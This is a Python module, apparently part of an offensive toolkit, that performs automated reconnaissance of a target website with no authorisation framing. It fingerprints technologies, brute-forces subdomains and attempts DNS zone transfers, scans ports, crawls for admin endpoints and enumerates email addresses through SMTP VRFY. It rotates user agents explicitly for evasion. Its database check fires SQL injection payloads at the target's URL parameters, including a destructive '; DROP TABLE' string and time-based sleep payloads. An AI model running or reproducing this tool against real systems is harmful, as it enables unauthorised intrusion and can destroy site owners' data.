# modules/reconnaissance.py
import requests
import subprocess
import json
import asyncio
import aiohttp
import socket
import ssl
import concurrent.futures
from bs4 import BeautifulSoup
import dns.resolver
import whois
import re
from urllib.parse import urlparse, urljoin
import time
import random
from datetime import datetime

class TargetRecon:
    def __init__(self):
        self.target_info = {}
        self.session = None
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        
    def get_random_headers(self):
        """Generate random headers for evasion"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
    async def technology_stack_detection(self, url):
        """Advanced web technology detection"""
        technologies = {
            'web_servers': [],
            'frameworks': [],
            'cms': [],
            'databases': [],
            'javascript': [],
            'css_frameworks': [],
            'analytics': [],
            'security': [],
            'cdn': [],
            'programming_languages': []
        }
        
        try:
            headers = self.get_random_headers()
            async with aiohttp.ClientSession(headers=headers) as session:
                async with session.get(url, timeout=10) as response:
                    response_text = await response.text()
                    response_headers = response.headers
                    
                    # Server identification
                    server = response_headers.get('Server', '').lower()
                    if server:
                        if 'apache' in server:
                            technologies['web_servers'].append('Apache')
                        elif 'nginx' in server:
                            technologies['web_servers'].append('Nginx')
                        elif 'iis' in server:
                            technologies['web_servers'].append('IIS')
                        elif 'cloudflare' in server:
                            technologies['cdn'].append('Cloudflare')
                            
                    # X-Powered-By header
                    powered_by = response_headers.get('X-Powered-By', '').lower()
                    if powered_by:
                        if 'php' in powered_by:
                            technologies['programming_languages'].append(f'PHP {powered_by}')
                        elif 'asp.net' in powered_by:
                            technologies['frameworks'].append('ASP.NET')
                            
                    # HTML content analysis
                    soup = BeautifulSoup(response_text, 'html.parser')
                    html_content = response_text.lower()
                    
                    # CMS Detection
                    cms_patterns = {
                        'WordPress': ['wp-content', 'wp-includes', '/wp-admin/', 'wordpress'],
                        'Drupal': ['drupal', 'sites/default/files', 'misc/drupal.js'],
                        'Joomla': ['joomla', '/administrator/', 'option=com_'],
                        'Magento': ['magento', 'skin/frontend', 'mage/cookies'],
                        'Shopify': ['shopify', 'cdn.shopify.com', 'shopify-analytics'],
                        'Django': ['csrfmiddlewaretoken', '__admin_media_prefix__'],
                        'Laravel': ['laravel_session', '_token', 'laravel'],
                        'CodeIgniter': ['codeigniter', 'ci_session']
                    }
                    
                    for cms, patterns in cms_patterns.items():
                        if any(pattern in html_content for pattern in patterns):
                            technologies['cms'].append(cms)
                            
                    # JavaScript Framework Detection
                    js_patterns = {
                        'React': ['react', 'reactjs', 'react-dom'],
                        'Angular': ['angular', 'angularjs', 'ng-app'],
                        'Vue.js': ['vue', 'vuejs', 'vue-router'],
                        'jQuery': ['jquery', '$.', 'jquery.min.js'],
                        'Bootstrap': ['bootstrap', 'bootstrap.min.js'],
                        'Ember.js': ['ember', 'emberjs'],
                        'Backbone.js': ['backbone', 'backbonejs']
                    }
                    
                    for js_fw, patterns in js_patterns.items():
                        if any(pattern in html_content for pattern in patterns):
                            technologies['javascript'].append(js_fw)
                            
                    # CSS Framework Detection
                    css_patterns = {
                        'Bootstrap': ['bootstrap', 'bootstrap.min.css'],
                        'Foundation': ['foundation', 'foundation.min.css'],
                        'Bulma': ['bulma', 'bulma.min.css'],
                        'Semantic UI': ['semantic-ui', 'semantic.min.css']
                    }
                    
                    for css_fw, patterns in css_patterns.items():
                        if any(pattern in html_content for pattern in patterns):
                            technologies['css_frameworks'].append(css_fw)
                            
                    # Analytics & Tracking
                    analytics_patterns = {
                        'Google Analytics': ['google-analytics', 'gtag', 'ga.js'],
                        'Google Tag Manager': ['googletagmanager', 'gtm.js'],
                        'Facebook Pixel': ['facebook.net/tr', 'fbevents.js'],
                        'Hotjar': ['hotjar', 'hj.js']
                    }
                    
                    for analytics, patterns in analytics_patterns.items():
                        if any(pattern in html_content for pattern in patterns):
                            technologies['analytics'].append(analytics)
                            
                    # Security Headers Analysis
                    security_headers = {
                        'Content-Security-Policy': response_headers.get('Content-Security-Policy'),
                        'X-Frame-Options': response_headers.get('X-Frame-Options'),
                        'X-XSS-Protection': response_headers.get('X-XSS-Protection'),
                        'Strict-Transport-Security': response_headers.get('Strict-Transport-Security'),
                        'X-Content-Type-Options': response_headers.get('X-Content-Type-Options')
                    }
                    
                    technologies['security'] = {k: v for k, v in security_headers.items() if v}
                    
                    # CDN Detection
                    cdn_patterns = {
                        'Cloudflare': ['cloudflare', 'cf-ray'],
                        'AWS CloudFront': ['cloudfront', 'amazonaws.com'],
                        'MaxCDN': ['maxcdn', 'netdna'],
                        'KeyCDN': ['keycdn'],
                        'Fastly': ['fastly']
                    }
                    
                    for cdn, patterns in cdn_patterns.items():
                        if any(pattern in str(response_headers).lower() for pattern in patterns):
                            technologies['cdn'].append(cdn)
                            
        except Exception as e:
            print(f"Technology detection error: {e}")
            technologies['error'] = str(e)
            
        return technologies
    
    async def database_backend_identification(self, url):
        """Advanced database backend identification"""
        db_indicators = {
            'mysql': [],
            'postgresql': [],
            'mssql': [],
            'oracle': [],
            'mongodb': [],
            'sqlite': []
        }
        
        # Error-based detection payloads
        error_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE test; --",
            "' UNION SELECT 1,2,3,4,5 --",
            "' AND (SELECT * FROM information_schema.tables) --",
            "'; WAITFOR DELAY '00:00:05' --",
            "' AND SLEEP(5) --",
            "' OR pg_sleep(5) --",
            "' UNION SELECT NULL,version() --"
        ]
        
        # Common parameters to test
        test_params = ['id', 'user', 'page', 'cat', 'item', 'product']
        
        try:
            for param in test_params:
                for payload in error_payloads:
                    try:
                        headers = self.get_random_headers()
                        test_url = f"{url}?{param}={payload}"
                        
                        async with aiohttp.ClientSession() as session:
                            async with session.get(test_url, headers=headers, timeout=5) as response:
                                response_text = await response.text()
                                
                                # MySQL error patterns
                                mysql_patterns = [
                                    'mysql_fetch_array()', 'mysql_num_rows()', 'mysql_query()',
                                    'You have an error in your SQL syntax', 'mysql_connect()',
                                    'Warning: mysql_'
                                ]
                                
                                # PostgreSQL error patterns
                                postgres_patterns = [
                                    'PostgreSQL query failed', 'pg_query()', 'pg_exec()',
                                    'PostgreSQL', 'postgres', 'psql'
                                ]
                                
                                # MSSQL error patterns
                                mssql_patterns = [
                                    'Microsoft OLE DB Provider', 'ODBC SQL Server Driver',
                                    'Microsoft SQL Server', 'Incorrect syntax near'
                                ]
                                
                                # Oracle error patterns
                                oracle_patterns = [
                                    'ORA-', 'Oracle JDBC Driver', 'Oracle Database'
                                ]
                                
                                # Check for database-specific errors
                                response_lower = response_text.lower()
                                
                                for pattern in mysql_patterns:
                                    if pattern.lower() in response_lower:
                                        db_indicators['mysql'].append({
                                            'payload': payload,
                                            'parameter': param,
                                            'evidence': pattern
                                        })
                                        
                                for pattern in postgres_patterns:
                                    if pattern.lower() in response_lower:
                                        db_indicators['postgresql'].append({
                                            'payload': payload,
                                            'parameter': param,
                                            'evidence': pattern
                                        })
                                        
                                for pattern in mssql_patterns:
                                    if pattern.lower() in response_lower:
                                        db_indicators['mssql'].append({
                                            'payload': payload,
                                            'parameter': param,
                                            'evidence': pattern
                                        })
                                        
                                for pattern in oracle_patterns:
                                    if pattern.lower() in response_lower:
                                        db_indicators['oracle'].append({
                                            'payload': payload,
                                            'parameter': param,
                                            'evidence': pattern
                                        })
                                        
                    except Exception:
                        continue
                        
        except Exception as e:
            print(f"Database identification error: {e}")
            
        return db_indicators
    
    async def subdomain_enumeration(self, domain):
        """Advanced subdomain enumeration"""
        subdomains = set()
        
        # Common subdomain wordlist
        common_subdomains = [
            'www', 'api', 'admin', 'test', 'dev', 'staging', 'mail', 'ftp', 'blog',
            'shop', 'app', 'mobile', 'secure', 'login', 'panel', 'cpanel', 'webmail',
            'portal', 'dashboard', 'control', 'manage', 'support', 'help', 'docs',
            'beta', 'alpha', 'demo', 'sandbox', 'old', 'new', 'backup', 'db',
            'database', 'mysql', 'postgres', 'redis', 'mongo', 'elastic', 'search',
            'cdn', 'static', 'assets', 'media', 'images', 'files', 'downloads',
            'upload', 'uploads', 'cloud', 'vpn', 'proxy', 'gateway', 'edge'
        ]
        
        # DNS brute force
        async def check_subdomain(subdomain):
            try:
                full_domain = f"{subdomain}.{domain}"
                resolver = dns.resolver.Resolver()
                resolver.timeout = 2
                resolver.lifetime = 2
                answer = resolver.resolve(full_domain, 'A')
                return full_domain, [str(rdata) for rdata in answer]
            except:
                return None, None
                
        # Concurrent DNS resolution
        tasks = [check_subdomain(sub) for sub in common_subdomains]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, tuple) and result[0]:
                subdomains.add(result[0])
        
        # Certificate Transparency Logs
        try:
            ct_url = f"https://crt.sh/?q=%25.{domain}&output=json"
            async with aiohttp.ClientSession() as session:
                async with session.get(ct_url, timeout=10) as response:
                    if response.status == 200:
                        certificates = await response.json()
                        for cert in certificates:
                            name = cert.get('name_value', '')
                            if name and not name.startswith('*') and '.' in name:
                                subdomains.add(name.strip())
        except Exception as e:
            print(f"Certificate transparency error: {e}")
            
        # DNS Zone Transfer attempt
        try:
            ns_records = dns.resolver.resolve(domain, 'NS')
            for ns in ns_records:
                try:
                    zone = dns.zone.from_xfr(dns.query.xfr(str(ns), domain))
                    for name in zone:
                        if name != '@':
                            subdomains.add(f"{name}.{domain}")
                except:
                    continue
        except:
            pass
            
        return list(subdomains)
    
    async def port_scanning(self, target):
        """Advanced port scanning"""
        common_ports = [
            21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995,
            3306, 5432, 1433, 1521, 3389, 5900, 8080, 8443, 8888
        ]
        
        open_ports = []
        
        async def scan_port(host, port):
            try:
                future = asyncio.open_connection(host, port)
                reader, writer = await asyncio.wait_for(future, timeout=2)
                writer.close()
                await writer.wait_closed()
                return port, True
            except:
                return port, False
                
        # Parse hostname from URL
        if target.startswith('http'):
            hostname = urlparse(target).hostname
        else:
            hostname = target
            
        # Concurrent port scanning
        tasks = [scan_port(hostname, port) for port in common_ports]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, tuple) and result[1]:
                open_ports.append(result[0])
                
        return open_ports
    
    async def ssl_certificate_analysis(self, hostname):
        """SSL certificate analysis"""
        cert_info = {}
        
        try:
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    cert_info = {
                        'subject': dict(x[0] for x in cert.get('subject', [])),
                        'issuer': dict(x[0] for x in cert.get('issuer', [])),
                        'version': cert.get('version'),
                        'serial_number': cert.get('serialNumber'),
                        'not_before': cert.get('notBefore'),
                        'not_after': cert.get('notAfter'),
                        'subject_alt_name': [x[1] for x in cert.get('subjectAltName', [])],
                        'signature_algorithm': cert.get('signatureAlgorithm')
                    }
                    
        except Exception as e:
            cert_info['error'] = str(e)
            
        return cert_info
    
    async def whois_lookup(self, domain):
        """Enhanced WHOIS lookup"""
        whois_info = {}
        
        try:
            w = whois.whois(domain)
            whois_info = {
                'domain_name': w.domain_name,
                'registrar': w.registrar,
                'creation_date': w.creation_date,
                'expiration_date': w.expiration_date,
                'name_servers': w.name_servers,
                'status': w.status,
                'emails': w.emails,
                'country': w.country,
                'org': w.org
            }
        except Exception as e:
            whois_info['error'] = str(e)
            
        return whois_info
    
    async def web_crawler(self, url, max_depth=2):
        """Web crawler to find interesting endpoints"""
        visited_urls = set()
        interesting_endpoints = []
        
        async def crawl_recursive(current_url, depth):
            if depth > max_depth or current_url in visited_urls:
                return
                
            visited_urls.add(current_url)
            
            try:
                headers = self.get_random_headers()
                async with aiohttp.ClientSession() as session:
                    async with session.get(current_url, headers=headers, timeout=10) as response:
                        if response.content_type == 'text/html':
                            html = await response.text()
                            soup = BeautifulSoup(html, 'html.parser')
                            
                            # Find interesting endpoints
                            interesting_patterns = [
                                '/admin', '/administrator', '/login', '/wp-admin',
                                '/config', '/settings', '/api', '/v1/', '/v2/',
                                '/dashboard', '/panel', '/control', '/manage'
                            ]
                            
                            for pattern in interesting_patterns:
                                if pattern in current_url.lower():
                                    interesting_endpoints.append({
                                        'url': current_url,
                                        'pattern': pattern,
                                        'status_code': response.status
                                    })
                            
                            # Extract links for further crawling
                            links = soup.find_all('a', href=True)
                            for link in links:
                                href = link['href']
                                full_url = urljoin(current_url, href)
                                
                                if full_url.startswith(url) and depth < max_depth:
                                    await crawl_recursive(full_url, depth + 1)
                                    
            except Exception as e:
                print(f"Crawling error for {current_url}: {e}")
                
        await crawl_recursive(url, 0)
        return interesting_endpoints
    
    async def email_enumeration(self, domain):
        """Email address enumeration"""
        common_emails = [
            'admin', 'administrator', 'support', 'info', 'contact', 'sales',
            'marketing', 'webmaster', 'postmaster', 'root', 'test', 'demo'
        ]
        
        valid_emails = []
        
        # SMTP enumeration (VRFY command)
        try:
            import smtplib
            smtp_server = f"mail.{domain}"
            with smtplib.SMTP(smtp_server, 25, timeout=5) as server:
                for email_prefix in common_emails:
                    email = f"{email_prefix}@{domain}"
                    try:
                        code, message = server.verify(email)
                        if code == 250:
                            valid_emails.append({
                                'email': email,
                                'method': 'SMTP_VRFY',
                                'response': message.decode()
                            })
                    except:
                        continue
        except:
            pass
            
        return valid_emails
    
    async def comprehensive_recon(self, target):
        """Comprehensive reconnaissance of target"""
        recon_results = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'results': {}
        }
        
        # Parse domain from URL
        if target.startswith('http'):
            domain = urlparse(target).hostname
        else:
            domain = target
            target = f"https://{target}"
            
        print(f"🔍 Starting comprehensive reconnaissance for: {target}")
        
        # Technology stack detection
        print("📊 Detecting technology stack...")
        recon_results['results']['technology'] = await self.technology_stack_detection(target)
        
        # Database identification
        print("🗄️ Identifying database backend...")
        recon_results['results']['database'] = await self.database_backend_identification(target)
        
        # Subdomain enumeration
        print("🌐 Enumerating subdomains...")
        recon_results['results']['subdomains'] = await self.subdomain_enumeration(domain)
        
        # Port scanning
        print("🔌 Scanning ports...")
        recon_results['results']['open_ports'] = await self.port_scanning(domain)
        
        # SSL certificate analysis
        print("🔐 Analyzing SSL certificate...")
        recon_results['results']['ssl_certificate'] = await self.ssl_certificate_analysis(domain)
        
        # WHOIS lookup
        print("📋 Performing WHOIS lookup...")
        recon_results['results']['whois'] = await self.whois_lookup(domain)
        
        # Web crawling
        print("🕷️ Crawling web application...")
        recon_results['results']['interesting_endpoints'] = await self.web_crawler(target)
        
        # Email enumeration
        print("📧 Enumerating email addresses...")
        recon_results['results']['emails'] = await self.email_enumeration(domain)
        
        return recon_results
    
    async def save_results(self, results, output_file):
        """Save reconnaissance results"""
        # JSON format
        with open(f"{output_file}_recon.json", 'w') as f:
            json.dump(results, f, indent=2, default=str)
            
        # Text format for easy reading
        with open(f"{output_file}_recon.txt", 'w') as f:
            f.write(f"=== Reconnaissance Report for {results['target']} ===\n\n")
            f.write(f"Timestamp: {results['timestamp']}\n\n")
            
            # Technology stack
            f.write("=== Technology Stack ===\n")
            tech = results['results']['technology']
            for category, items in tech.items():
                if items:
                    f.write(f"{category.upper()}: {', '.join(map(str, items))}\n")
            f.write("\n")
            
            # Subdomains
            f.write("=== Discovered Subdomains ===\n")
            for subdomain in results['results']['subdomains']:
                f.write(f"  - {subdomain}\n")
            f.write("\n")
            
            # Open ports
            f.write("=== Open Ports ===\n")
            for port in results['results']['open_ports']:
                f.write(f"  - Port {port}/tcp\n")
            f.write("\n")
            
            # Interesting endpoints
            f.write("=== Interesting Endpoints ===\n")
            for endpoint in results['results']['interesting_endpoints']:
                f.write(f"  - {endpoint['url']} (Pattern: {endpoint['pattern']})\n")
            f.write("\n")
            
        print(f"✅ Reconnaissance results saved to {output_file}_recon.json and {output_file}_recon.txt")

# Example usage
if __name__ == "__main__":
    import asyncio
    
    async def main():
        recon = TargetRecon()
        results = await recon.comprehensive_recon("https://example.com")
        await recon.save_results(results, "example_recon")
        
    asyncio.run(main())
